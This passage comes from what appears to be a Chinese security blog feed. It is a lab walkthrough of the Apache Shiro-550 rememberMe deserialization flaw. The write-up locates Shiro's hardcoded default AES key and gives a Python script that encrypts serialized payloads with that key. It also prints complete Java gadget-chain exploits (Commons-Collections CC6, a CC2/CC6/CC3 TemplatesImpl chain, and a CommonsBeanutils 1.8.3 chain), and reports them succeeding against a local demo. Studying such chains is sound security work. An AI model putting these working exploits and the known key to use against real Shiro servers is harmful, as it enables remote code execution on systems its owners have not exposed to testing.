alt="image-20240611234718498"></p><p>且解码的流程就是<strong>base64解码&#x3D;》AES解密&#x3D;》反序列化</strong></p><p>我们可以直接去源码搜索对应的函数，可以全局搜索一下Cookie关键字</p><p>可以找到一个CookieRememberMeManger函数，这名字就很明显了</p><p><img src="http://cdn.clown2024.cn/202407151444235.png" alt="image-20240612000131474"></p><p>然后里面有对cookie处理的很多函数，我们可以找到一个序列化和反序列化之类相关的方法，这里先找一个反序列化相关的函数，然后往上寻找调用链，找到他的固定key</p><p><img src="http://cdn.clown2024.cn/202407151444236.png" alt="image-20240613221027529"></p><p>这里就是获取序列化内容反序列化，然后base64解码，返回的对应AES加密的内容</p><p>往上找调用方法</p><p><img src="http://cdn.clown2024.cn/202407151444237.png" alt="image-20240613221343146"></p><p>这里进行了convert转换了一下，这里函数再往上找已经是一些校验相关的功能了，那就是这个函数已经完成了解密，跟进去函数看看</p><p><img src="http://cdn.clown2024.cn/202407151444238.png" alt="image-20240613221819479"></p><p>果然，里面进行了解密，然后再进行反序列化之后返回</p><p>从其中的函数功能最终跟踪下去可以在<strong>AbstractRememberMeManager</strong>这个类的构造方法找到固定key的赋值</p><p><img src="http://cdn.clown2024.cn/202407151444239.png" alt="image-20240612001639914"></p><p><img src="http://cdn.clown2024.cn/202407151444240.png" alt="image-20240612001655002"></p><p>可以知道其密钥是固定字符串的base64解码得到</p><p>知道了固定密钥之后构造对应的rememberMe字符串就很简单了，AES加密的脚本可以网上找一下</p><h2><span id="打cc链">打cc链</span></h2><p>一般shiro都会有cc的包</p><p><img src="http://cdn.clown2024.cn/202407151444241.png" alt="image-20240612001947670"></p><p>但是不一定可以打，我们可以用插件分析一下依赖关系</p><p><img src="http://cdn.clown2024.cn/202407151444242.png" alt="image-20240612002101256"></p><p>被标了test的运行时都不会被编译，所以一般线上的时候都是打不通的，不过这里的原因是没有代码去使用这个依赖，没有import它。</p><p><strong>这里原生shiro没有自带cc依赖</strong></p><p>这里加一个3.2.1的版本</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>AES加密的脚本</strong></p><p>网上找的一个脚本：<a href="https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki=sF54D&alichlgref=https://www.google.com/#toc-1">https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki%3DsF54D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s:s +((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64encode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s : s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><blockquote><p>这个Crypto库有点坑，第一次用，记录一下</p><p>先安装下面这个库</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pip3 install pycryptodome<br></code></pre></td></tr></table></figure><p>然后需要去c:\users\86189\appdata\local\programs\python\python37\lib\site-packages路径下将一个crypto的文件夹的c改成大写的C即可</p></blockquote><p><strong>固定密钥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kPH+bIxk5D2deZiIxcaaaA==<br></code></pre></td></tr></table></figure><p>我们可以先打一个cc6的链子试一试</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6_demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//这里待会调用的时候会在mpa新增加一个键值对aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将生成的ser.bin文件进行aes加密后再base64进行传参</p><blockquote><p>这里我一开始试了一下用cyberchef来加密发现不行，还是得用上面的脚本</p></blockquote><p>先看一下正常的：</p><p><img src="http://cdn.clown2024.cn/202407151444243.png" alt="image-20240614215924819"></p><p>打了cc6的：</p><p><img src="http://cdn.clown2024.cn/202407151444244.png" alt="image-20240614220816682"></p><p>这里就是没登录上去是正常的，后端开启debug去看一下，这时候应该是有报错的</p><p><img src="http://cdn.clown2024.cn/202407151444245.png" alt="image-20240614232811726"></p><p>这里是反序列化抛了异常，说是无法加载invokerTransformer，就是由于shiro无法处理数组导致的，后面再说，比较复杂</p><blockquote><p>但是这里报错的又不太对啊，他是cc的全部类都无法加载，太怪了</p></blockquote><p>所以这里我们就需要改一下链子，改成不用chainedTransformer数组的形式，也就是拼一下链子就好，然后最后要改成<strong>动态类加载执行任意代码的方式</strong></p><p>这里使用<strong>cc2+cc6+cc3</strong>的方式进行拼接</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_ccDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//cc6</span><br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">//这里要添加进去templates</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,invokerTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(templates);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>服了这里也没打通，后台直接报错TiedMapEntry都无法加载</p><p>后来我用了p神的环境就能打通了，估计还是cc依赖运行时没有被编译进去</p><p>这是p神的环境：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p><img src="http://cdn.clown2024.cn/202407151444246.png" alt="image-20240615104853896"></p><blockquote><p>打的时候要去掉<strong>JSESSIONID</strong></p></blockquote><h2><span id="打cb链">打CB链</span></h2><p>CB链打的是shiro自带的依赖：commons-beanutils（就是对javabean的增强类），这里注意一下版本是1.8.3的，本地写exp的时候记得版本也要一致，不然会打不通</p><p>下面是一个简单的javaBean的例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(PropertyUtils.getProperty(person, <span class="hljs-string">&quot;age&quot;</span>));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们可以不需要再去调用get方法来获取属性值，而是直接用PropertyUtils的静态方法来获取</p><p>然后在这处理的过程中就存在反序列化的点，就直接说了反序列化的点就是会调用javaBean的get方法，比如上面的age就会调用<strong>getAge</strong>方法</p><p>我们可以调试跟进去看一下我们传入了name为”age”之后发生了什么</p><p>一路跟进下去，会在一个getSimpleProperty的方法里面获取到javaBean的各种方法，然后会把我们传进去的名字从小写改成大写</p><blockquote><p>而且我们这里不传大写的属性名进去，不然会报错</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444247.png" alt="image-20240615093151593"></p><p>再往下两行，他就获取了读取属性的get方法，然后进行函数调用，获取了age的值</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093518572.png" alt="image-20240615093518572"></p><p>我们传进去的javaBean最终就会变成我们指定的属性的值然后返回</p><p><img src="http://cdn.clown2024.cn/202407151444248.png" alt="image-20240615093640915"></p><p><img src="http://cdn.clown2024.cn/202407151444249.png" alt="image-20240615093725798"></p><p>这里其中存在的利用点就是这个get方法的调用</p><h3><span id="templatesimpl">TemplatesImpl</span></h3><p>这里就跟我们动态类加载任意代码的这个类有关</p><p>它里面有一个<strong>getOutputProperties()<strong>的方法，这个方法的就很符合javaBean的方式，最重要的是它里面还调用了</strong>newTransformer</strong>这个方法</p><p><img src="http://cdn.clown2024.cn/202407151444250.png" alt="image-20240615094412956"></p><p>所以我们只需要传一个<strong>outputProperties</strong>的名字进去就可以调用这个方法，记得这里一定要是<strong>小写</strong>的形式</p><h3><span id="beancomparator">BeanComparator</span></h3><p>接下来就是从<strong>ProperUtils</strong>往上找看谁调用了他的<strong>getProperty</strong>方法</p><p>这里就找到BeanComparator的compare方法</p><p><img src="http://cdn.clown2024.cn/202407151444251.png" alt="image-20240615094845997"></p><p>看一下他的构造方法</p><p><img src="http://cdn.clown2024.cn/202407151444252.png" alt="image-20240615095155801"></p><p>这里也提前说一下，我们需要调用下面的构造方法，而不能调用上面的，因为上面的ComparableComparator是属于Commoms-Collections里面的方法，而shiro自带是没有这个的，我们打了就会报错</p><p>所以这里comparator我们就需要赋值一个java本身就有的而且是继承了序列化接口的类，这里直接用组长视频里面用的那个<strong>AttrCompare</strong>类</p><h3><span id="priorityqueue">PriorityQueue</span></h3><p>见到这个compare就很熟悉了，我们的cc2和cc4里面就是利用了PriorityQueue的readObject方法，然后里面调用compare方法的，那链子就基本串起来了</p><p>现在可以来写一个exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cc_chain.shiro_cb;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Person person = new Person(10,&quot;aa&quot;);</span><br><span class="hljs-comment">//        System.out.println(PropertyUtils.getProperty(person, &quot;age&quot;));</span><br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br>        <span class="hljs-comment">//CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//先传一个没用东西阻断链子执行</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        <span class="hljs-comment">//这里的size要满足要求才能触发调用链执行，这里需要改用添加元素才行，因为我们的templates还没有加入进去</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//然后反射修改回来priorityQueue的值</span><br>        Class p=PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,beanComparator);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用了比较懒的改法，直接借用了一下cc4这个类，主要是为了序列化能成功，本地测试无所谓，其他改法调了半天都报错懒得调了。。。</p><p><img src="http://cdn.clown2024.cn/202407151444253.png" alt="image-20240615103205401"></p><p><strong>打一下shiro看看效果</strong></p><p><img src="http://cdn.clown2024.cn/202407151444254.png" alt="image-20240615103608867"></p><p>可以成功打通</p><blockquote><p>注意这里如果用ysoserial生成的payload打是打不通的，因为他的CB版本和shiro的不一样</p><p>这里用的官方环境没有删掉<strong>JSESSIONID</strong>竟然也通了（</p></blockquote><h3><span id="cb链调用图">CB链调用图</span></h3><p><img src="http://cdn.clown2024.cn/202407151444255.png" alt="image-20240615001956606"></p><h1><span id="shiro721">Shiro721</span></h1>]]></content>
      
      
      <categories>
          
          <category> java漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASM学习</title>
      <link href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/</url>
      
